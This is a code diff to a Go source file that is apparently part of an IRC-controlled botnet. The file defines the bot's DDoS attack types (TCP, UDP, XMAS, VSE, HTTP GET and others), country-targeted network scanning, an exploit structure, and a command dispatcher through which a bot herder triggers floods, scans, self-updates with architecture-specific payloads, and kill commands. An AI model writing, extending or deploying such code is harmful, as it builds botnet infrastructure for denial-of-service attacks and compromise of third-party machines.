@@ -1,8 +1,8 @@
 package lib
 
 import (
+	"io"
 	"net"
-	"strings"
 	"time"
 
 	"golang.org/x/crypto/ssh"
@@ -10,28 +10,42 @@ import (
 
 var BotReader *string
 
+/*
+	These 2 values doesn't merge with bot structure because of a "fileName" function,
+	i want it to be a global function that every structure can access.
+*/
+var BotGroup, BotID string
+
 type Bot struct {
-	CPU                          int
-	payload, newPayload, pServer string //"pServer" = Payload server
-	password, network            string
-	Channel, ChanKey             string
-	BotTag, BotHerder            string
-	scanOpt                      string
-	scanNetwork                  []string
-	isRandom, scanSwitch         bool
-	IRC                          net.Conn
-	timeout                      time.Duration
-	session                      *ssh.Client
+	CPU                   int
+	mipsArch, defaultArch string
+	password, network     string
+	Channel, ChanKey      string
+	BotTag, BotHerder     string
+	scanOpt, scanOptFull  string
+	tempIP                string
+	scanNetwork           []string
+	isRandom, scanSwitch  bool
+	IRC                   net.Conn
+	timeout               time.Duration
+	session               *ssh.Client
 }
 
 type Attack struct {
 	srcAddr, dstAddr, url                                string
 	dstPort                                              string
-	httpMethod, reqHeader                                string
+	attackBody                                           io.Reader
 	flags                                                string
 	reportSwitch, attackSwitch                           bool
 	ddosPayload                                          []byte
 	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
+}
+
+type Exploit struct {
+	exploitName                                                     string
+	exploitBody                                                     io.Reader
+	exploitMethod, exploitHeader                                    string
+	exploitAgent, exploitAccept, exploitContType, exploitConnection string
 }
 
 type Caller struct {
@@ -42,22 +56,27 @@ type Caller struct {
 var ScanMap = map[string]Bot{
 	"-cn": {
 		scanNetwork: ChinaNetwork,
+		scanOptFull: "\"CHINA\"",
 		isRandom:    false,
 	},
 	"-hk": {
 		scanNetwork: HongKongNetwork,
+		scanOptFull: "\"HONG KONG\"",
 		isRandom:    false,
 	},
 	"-kr": {
 		scanNetwork: KoreaNetwork,
+		scanOptFull: "\"SOUTH KOREA\"",
 		isRandom:    false,
 	},
 	"-br": {
 		scanNetwork: BrazilNetwork,
+		scanOptFull: "\"BRAZIL\"",
 		isRandom:    false,
 	},
 	"-r": {
 		scanNetwork: RandomNetwork,
+		scanOptFull: "\"RANDOM\"",
 		isRandom:    true,
 	},
 }
@@ -87,9 +106,9 @@ var TCPAttackMap = map[string]Attack{
 	Blacklist IP that will be skip in random scanning process. Skip since first network ID.
 	Some of these first network ID may be anything not mentionally to be the thing that i have commented because i skip since first network ID.
 	I don't recommend you to write map like this in Go, i do this because you know...
-	In my opinion it's look cleaner than using if statement with "or" operator for these bunch of Blacklist IP.
+	In my opinion it's look cleaner than using if statement with "or" operator for these bunch of Blacklist IPs.
 */
-var BlacklistIP = map[string]struct{}{
+var BlacklistIPs = map[string]struct{}{
 
 	/*
 		Loopback
@@ -199,18 +218,10 @@ var BlacklistIP = map[string]struct{}{
 	"30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
 }
 
-func (b *Bot) AccessPerms() bool {
-	return Find(Recv(*BotReader, 0), b.BotHerder)
-}
-
-func ComdSetup(args int, cut string) string {
-	return strings.Trim(Recv(*BotReader, args), cut)
-}
-
 func SetupCaller() (Caller, bool) {
 	if Find(*BotReader, "?tcp") {
 		var CALL_5_ARG = map[string]Caller{
-			ComdSetup(3, ":"): {
+			setupComd(3, ":"): {
 				CallAttack: &Attack{
 					flags:        Recv(*BotReader, 4),
 					srcAddr:      Recv(*BotReader, 5),
@@ -222,11 +233,11 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_5_ARG[ComdSetup(3, ":")]
+		value, key := CALL_5_ARG[setupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?paf") || Find(*BotReader, "?xmas") {
+	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?xmas") {
 		var CALL_4_ARG = map[string]Caller{
-			ComdSetup(3, ":"): {
+			setupComd(3, ":"): {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
@@ -237,11 +248,24 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_4_ARG[ComdSetup(3, ":")]
+		value, key := CALL_4_ARG[setupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?scan") || Find(*BotReader, "?update") {
+	} else if Find(*BotReader, "?scan") {
+		var CALL_3_ARG = map[string]Caller{
+			setupComd(3, ":"): {
+				CallBot: &Bot{
+					scanOpt:     Recv(*BotReader, 4),
+					defaultArch: Recv(*BotReader, 5),
+					mipsArch:    Recv(*BotReader, 6),
+					scanSwitch:  false,
+				},
+			},
+		}
+		value, key := CALL_3_ARG[setupComd(3, ":")]
+		return value, key
+	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?update") {
 		var CALL_2_ARG = map[string]Caller{
-			ComdSetup(3, ":"): {
+			setupComd(3, ":"): {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
@@ -249,25 +273,18 @@ func SetupCaller() (Caller, bool) {
 					reportSwitch: false,
 				},
 			},
-			"?scan": {
-				CallBot: &Bot{
-					scanOpt:    Recv(*BotReader, 4),
-					pServer:    Recv(*BotReader, 5),
-					scanSwitch: false,
-				},
-			},
 			"?update": {
 				CallBot: &Bot{
-					newPayload: Recv(*BotReader, 4),
-					pServer:    Recv(*BotReader, 5),
+					defaultArch: Recv(*BotReader, 4),
+					mipsArch:    Recv(*BotReader, 5),
 				},
 			},
 		}
-		value, key := CALL_2_ARG[ComdSetup(3, ":")]
+		value, key := CALL_2_ARG[setupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?get") || Find(*BotReader, "?poling") {
+	} else if Find(*BotReader, "?poling") || Find(*BotReader, "?jumbo") || Find(*BotReader, "?get") {
 		var CALL_1_ARG = map[string]Caller{
-			ComdSetup(3, ":"): {
+			setupComd(3, ":"): {
 				CallAttack: &Attack{
 					url:          Recv(*BotReader, 4),
 					attackSwitch: false,
@@ -275,11 +292,11 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_1_ARG[ComdSetup(3, ":")]
+		value, key := CALL_1_ARG[setupComd(3, ":")]
 		return value, key
 	} else if Find(*BotReader, "?info") || Find(*BotReader, "?kill") || Find(*BotReader, "?stopddos") || Find(*BotReader, "?stopscan") {
 		var CALL_NON_ARG = map[string]Caller{
-			ComdSetup(3, ":"): {
+			setupComd(3, ":"): {
 				CallBot: &Bot{},
 			},
 			"?stopddos": {
@@ -294,7 +311,7 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_NON_ARG[ComdSetup(3, ":")]
+		value, key := CALL_NON_ARG[setupComd(3, ":")]
 		return value, key
 	}
 	return Caller{}, false
@@ -305,13 +322,13 @@ func (b *Bot) ExecuteCaller() (func(), bool) {
 		"?udp":      b.UDP,
 		"?tcp":      b.TCP,
 		"?saf":      b.SAF,
-		"?paf":      b.PAF,
 		"?xmas":     b.XMAS,
 		"?vse":      b.VSE,
 		"?fms":      b.FMS,
 		"?ipsec":    b.IPSEC,
-		"?get":      b.GET,
 		"?poling":   b.POLING,
+		"?jumbo":    b.JUMBO,
+		"?get":      b.GET,
 		"?scan":     b.Scanner,
 		"?update":   b.Update,
 		"?info":     b.Information,
@@ -319,7 +336,7 @@ func (b *Bot) ExecuteCaller() (func(), bool) {
 		"?stopddos": setAttackSwitch,
 		"?stopscan": setScanSwitch,
 	}
-	value, key := executesCallMap[ComdSetup(3, ":")]
+	value, key := executesCallMap[setupComd(3, ":")]
 	return value, key
 }
 
